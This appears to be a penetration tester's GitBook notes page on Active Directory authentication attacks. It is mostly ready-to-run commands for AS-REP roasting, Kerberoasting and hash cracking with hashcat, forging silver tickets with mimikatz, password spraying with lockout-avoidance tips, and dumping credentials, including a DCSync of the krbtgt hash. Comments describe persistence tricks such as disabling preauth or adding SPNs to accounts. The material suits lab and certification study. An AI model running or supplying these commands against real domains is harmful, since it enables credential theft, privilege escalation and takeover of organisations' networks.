# Authentication

## NTLM

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://learn.microsoft.com/en-us/archive/blogs/chiranth/ntlm-want-to-know-how-it-works" %}

A new security group needs to be introduced when talking about trees and forests. The **Enterprise Admins** group will grant a user administrative privileges over all of an enterprise's domains. Each domain would still have its Domain Admins with administrator privileges over their single domains and the Enterprise Admins who can control everything in the enterprise.

When using Windows domains, all credentials are stored in the Domain Controllers. Whenever a user tries to authenticate to a service using domain credentials, the service will need to ask the Domain Controller to verify if they are correct. Two protocols can be used for network authentication in windows domains:

* **Kerberos:** Used by any recent version of Windows. This is the default protocol in any recent domain.
* **NetNTLM:** Legacy authentication protocol kept for compatibility purposes.

## Kerberos

{% content-ref url="../../../enumeration/ports/88-kerberos.md" %}
[88-kerberos.md](../../../enumeration/ports/88-kerberos.md)
{% endcontent-ref %}

{% code overflow="wrap" fullWidth="true" %}
```powershell
https://en.wikipedia.org/wiki/Key_distribution_center
1 - AS-REQ containing timestamp + creds hash sent to the DC
2 - DC, acting as KDC, decrypt timestamp and hash. If successful, replies with AS-REP containing session key and TGT.
3 - When client wants to access a service, sends TGS-REQ with session key, resource name and encrypted TGT to the KDC.
4 - If the service exists, KDC decrypts the TGT and verifies timestamp, username and IP address. If succeeds, it sends TGS-REP containing session key, service name and service ticket.
5 - Client wants to connect to an app and it sends AP-REQ with session key and service ticket. The application server decrypts the service ticket.

# AS-REP Roasting
https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx
Get-DomainUser -PreauthNotRequired
impacket-GetNPUsers -dc-ip 192.168.0.50 -request -outputfile hashes.asreproast domain.com/$USER
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
.\Rubeus.exe asreproast /nowrap # does not need creds if we run it as authenticated domain user
# PERSISTENCE: if GenericAll or GenericWrite, we could modify a user to disable Kerberos preauth

# Kerberoasting (target SPNs - cracking TGS-REP hash)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast # does not need creds if we run it as authenticated domain user
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
# NOTE: better for user accounts since computer/managed service accounts and krbtgt have very long and randomly generated passwords
# PERSISTENCE: if GenericAll or GenericWrite, we could set an SPN for the user, make it kerberoastable, crack the hash and then delete SPN

# Fix KRB_AP_ERR_SKEW (Clock skew too great)
https://en.wikipedia.org/wiki/Ntpdate
https://en.wikipedia.org/wiki/Rdate

# Silver Tickets (forge our own service ticket if user/group permissions in the service ticket are not verified by the app)
To create a silver ticket we need:
• SPN password hash (e.g. via cached passwords)
• Domain SID (whoami /user, discard last 4 digits which are the RID)
• Target SPN
iwr -UseDefaultCredentials http://web01 # test at first HTTP SPN to see if our user has access denied
mimikatz # kerberos::golden /sid:$SID /domain:domain.com /ptt /target:web01.domain.com /service:http /rc4:$NTLM_SERVICE_HASH /user:myuser
klist
iwr -UseDefaultCredentials http://web01
# We could create tickets for domain users that do not exist
# Mitigation: security patch to update the PAC structure to not be able to forge tikets for non-existent domain users
https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041
```
{% endcode %}

[https://docs.microsoft.com/en-us/training/modules/implement-manage-active-directory-](https://docs.microsoft.com/en-us/training/modules/implement-manage-active-directory-)certificate-services/

## Password Attacks

{% code overflow="wrap" fullWidth="true" %}
```powershell
net accounts
https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
crackmapexec smb 192.168.0.202 -u users.txt -p 'Pass123!' -d domain.com -- continue-on-success
.\kerbrute_windows_amd64.exe passwordspray -d domain.com .\usernames.txt "Pass123!" # if network error, make sure encoding of .txt is ANSI
```
{% endcode %}

## Mimikatz

{% code overflow="wrap" %}
```bash
https://github.com/gentilkiwi/mimikatz
https://tools.thehacker.recipes/mimikatz/modules/lsadump/lsa
https://adsecurity.org/?page_id=1821#SEKURLSAPth
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
https://fuzzysecurity.com/tutorials/18.html
https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1

# If it misbehaves, try
.\mimikatz.exe "module::command" "module::command" "module::command" "exit"

privilege::debug
sekurlsa::logonpasswords # dump the credentials of all logged-on users
sekurlsa::tickets #user's tickets stored in memory / if we find TGT, better as it allows access any service
Invoke-Mimikatz -DumpCreds

# LSASS
lsadump::secrets
lsadump::sam # get local admin hash
lsadump::lsa /patch # dump hashes from memory by asking the LSA server, kinda like querying where the passwords are stored for users regardless of logged in or not
lsadump::cache
# Get domain admin hash whcih would work for psexec
lsadump::dcsync /user:domain\krbtgt /domain:lab.local
# VAULT
vault::creds
vault::list

# ADCS - export certificates with private keys
crypto::capi
crypto::cng
```
{% endcode %}

## Tickets

In general, we need to collect the following three pieces of information to create a silver ticket:

* SPN password hash
* Domain SID
* Target SPN

{% code overflow="wrap" %}
```powershell
# Check we cannot access the resource 
iwr -UseDefaultCredentials http://web04
# Now let's gather the SPN/service password hash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# And the domain SID that is the user SID minus the last digits (RID)
whoami /user
# Then we forge the ticket
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN (/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.
Finally, we must enter an existing domain user for /user:. This user will be set in the forged ticket. For this example, we'll use jeffadmin. However, we could also use any other domain user since we can set the permissions and groups ourselves.
PS C:\Tools> klist
# Now we could access the resource
PS C:\Tools> iwr -UseDefaultCredentials http://web04


# Requesting a Service Ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
klist #display all cached Kerberos tickets for the current user
(mimikatz) kerberos::list /export #download the service ticket (DO NOT PAY ATTENTION TO AES256 ENCRYPTION OR TGS$18$)
# Crack the ticket
kirbi2hashcat.py *.kirbi
hashcat -m 13100 hashes rockyou.txt --potfile-disable #krb5tgs$23$ format
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticket.kirbi
# Invoke-Kerberoast script instead of Mimikatz, autom. enum all SPNs, request service tickets and export them
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
# Extract all accounts in the SPN
setspn -T medin -Q ​ */*
"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-DomainSPNTicket
Invoke-Kerberoast -OutputFormat Hashcat | fl
hashcat -m 13100 -​a 0 hash.txt $wordlist --force
```
{% endcode %}

## Slow Password Guessing to avoid lockouts

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">net accounts
<strong>https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
</strong>.\Spray-Passwords.ps1 -Pass Qwerty09! -Admins
PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose
</code></pre>
